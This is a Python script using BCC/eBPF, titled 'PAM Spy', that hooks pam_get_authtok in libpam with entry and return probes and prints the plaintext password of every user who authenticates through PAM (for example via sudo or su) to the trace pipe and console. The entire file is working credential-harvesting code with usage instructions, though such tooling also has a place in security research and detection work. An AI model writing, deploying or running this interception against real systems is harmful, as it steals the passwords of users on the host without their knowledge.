#!/usr/bin/python3
from bcc import BPF
import ctypes.util
import os

# -----------------------------------------------------------------------------
# BPF C PROGRAM
# -----------------------------------------------------------------------------
# This C code runs in the kernel and is compiled by BCC.
# We use a hash map to share state between the entry probe (uprobe) and
# the return probe (uretprobe).
#
# Logic:
# 1. On entry (save_ptr_addr): We capture the pointer-to-pointer where PAM
#    will write the password. We save this address keyed by thread ID.
# 2. On return (read_and_print): We retrieve the saved address. We then
#    dereference it to find the string address, and finally read the string.
# -----------------------------------------------------------------------------
bpf_source = """
#include <uapi/linux/ptrace.h>
#include <linux/sched.h>

// Struct to define the key for our map (Thread ID)
struct key_t {
    u32 pid; // In kernel terms, task->pid is the thread ID.
};

// Map to store the address of the 'authtok' output parameter.
// Key: Thread ID (PID)
// Value: The address in user-space memory where the 'authtok' pointer is stored.
BPF_HASH(params_map, struct key_t, char **);

// -----------------------------------------------------------------------------
// UPROBE: Attached to the entry of pam_get_authtok
// Signature: int pam_get_authtok(pam_handle_t *pamh, int item, const char **authtok, const char *prompt);
//
// Goal: Capture the 3rd argument 'authtok'. This is a double pointer (char **)
// that PAM will populate with the address of the password string.
// -----------------------------------------------------------------------------
int trace_entry(struct pt_regs *ctx) {
    struct key_t key = {};
    char **authtok_ptr_addr;

    // 1. Get current thread ID
    key.pid = bpf_get_current_pid_tgid();

    // 2. Retrieve the 3rd argument (index 2 because 0-based) from registers.
    //    PT_REGS_PARM3 is a macro that abstracts architecture differences (e.g., RDX on x86_64).
    authtok_ptr_addr = (char **)PT_REGS_PARM3(ctx);

    // 3. Update the map with this address.
    params_map.update(&key, &authtok_ptr_addr);

    return 0;
}

// -----------------------------------------------------------------------------
// URETPROBE: Attached to the return of pam_get_authtok
//
// Goal: Retrieve the saved address, read the pointer it now contains, and
// then read the string content of that pointer.
// -----------------------------------------------------------------------------
int trace_return(struct pt_regs *ctx) {
    struct key_t key = {};
    char ***authtok_pp;
    char **authtok_p;
    char *authtok_val;
    char captured_str[80] = {}; // Buffer for the password

    // 1. Get current thread ID
    key.pid = bpf_get_current_pid_tgid();

    // 2. Lookup the address we saved on entry
    authtok_pp = params_map.lookup(&key);
    if (authtok_pp == 0) {
        return 0; // Missed entry or mismatch
    }

    // authtok_pp is a pointer to the address in the map.
    // The value IN the map is 'char **' (the user-stack/reg address).
    authtok_p = *authtok_pp;

    // 3. Read the 'char *' stored at the user-space address 'authtok_p'.
    //    We are dereferencing the 'char **' output argument to get the 'char *' result.
    //    bpf_probe_read_user gets data from user-space memory.
    if (bpf_probe_read_user(&authtok_val, sizeof(authtok_val), authtok_p) < 0) {
        // Failed to read the pointer
        params_map.delete(&key);
        return 0;
    }

    // 4. Now 'authtok_val' holds the address of the actual string.
    //    Read the string data from that address.
    if (bpf_probe_read_user_str(captured_str, sizeof(captured_str), authtok_val) < 0) {
        // Failed to read the string
        params_map.delete(&key);
        return 0;
    }

    // 5. Output the captured data to the kernel trace pipe.
    //    This is visible in /sys/kernel/debug/tracing/trace_pipe
    bpf_trace_printk("PAM Spy: PID %d returned authtok='%s'\\n", key.pid, captured_str);

    // 6. Cleanup map entry
    params_map.delete(&key);

    return 0;
}
"""

# -----------------------------------------------------------------------------
# PYTHON WRAPPER
# -----------------------------------------------------------------------------
import argparse
import sys

def find_libpam():
    """Attempt to locate libpam.so.0 on the system."""
    # 1. Try ctypes util
    path = ctypes.util.find_library("pam")
    if path and os.path.isabs(path) and os.path.exists(path):
        return path
    
    # 2. Common paths
    search_paths = [
        "/lib/x86_64-linux-gnu/libpam.so.0",
        "/usr/lib/x86_64-linux-gnu/libpam.so.0",
        "/lib64/libpam.so.0",
        "/usr/lib64/libpam.so.0",
        "/usr/lib/libpam.so.0",
        "/lib/libpam.so.0",
    ]
    
    for p in search_paths:
        if os.path.exists(p):
            return p
            
    return None

def main():
    parser = argparse.ArgumentParser(description="eBPF PAM Spy - Intercept pam_get_authtok")
    parser.add_argument("--lib", help="Path to libpam.so.0 (optional)", default=None)
    parser.add_argument("--pid", help="Filter by PID (optional)", type=int, default=0)
    args = parser.parse_args()

    print("[*] Compiling BPF program...")
    b = BPF(text=bpf_source)

    libpam_path = args.lib
    if not libpam_path:
        libpam_path = find_libpam()

    if not libpam_path:
        print("[!] Could not find libpam.so.0 automatically.")
        print("    Please locate it (e.g., 'find / -name libpam.so.0')")
        print("    and run: sudo python3 pam_spy.py --lib /path/to/libpam.so.0")
        sys.exit(1)
    
    print(f"[*] Found libpam at: {libpam_path}")
    print("[*] Attaching uprobes to 'pam_get_authtok'...")

    # Attach the ENTRY probe
    try:
        b.attach_uprobe(name=libpam_path, sym="pam_get_authtok", fn_name="trace_entry")
    except Exception as e:
        print(f"[!] Failed to attach uprobe: {e}")
        print("    Possible causes:")
        print("    1. Library path is incorrect?")
        print("    2. Library is stripped (no symbols)? Check with 'nm -D <lib>'")
        print("    3. Function name mismatch? (Unlikely for standard PAM)")
        sys.exit(1)

    # Attach the RETURN probe
    try:
        b.attach_uretprobe(name=libpam_path, sym="pam_get_authtok", fn_name="trace_return")
    except Exception as e:
        print(f"[!] Failed to attach uretprobe: {e}")
        sys.exit(1)

    print("[*] Probes attached! Listening for PAM authentication events...")
    print("[*] Trigger execution by running 'grep' with sudo (e.g., 'sudo grep') or 'su'.")
    print("[*] Output will appear below (Ctrl-C to stop):")
    print("-" * 60)

    # Loop and print trace output
    try:
        while True:
            # b.trace_readline() returns a bytes object
            line = b.trace_readline()
            if not line:
                continue
                
            try:
                decoded = line.decode().strip()
                # Basic filtering if PID is provided (done in userspace for simplicity here)
                if args.pid:
                    if f"PID {args.pid}" not in decoded:
                        continue
                print(decoded)
            except UnicodeDecodeError:
                print(line)
    except KeyboardInterrupt:
        print("\n[*] Detaching and exiting...")

if __name__ == "__main__":
    main()
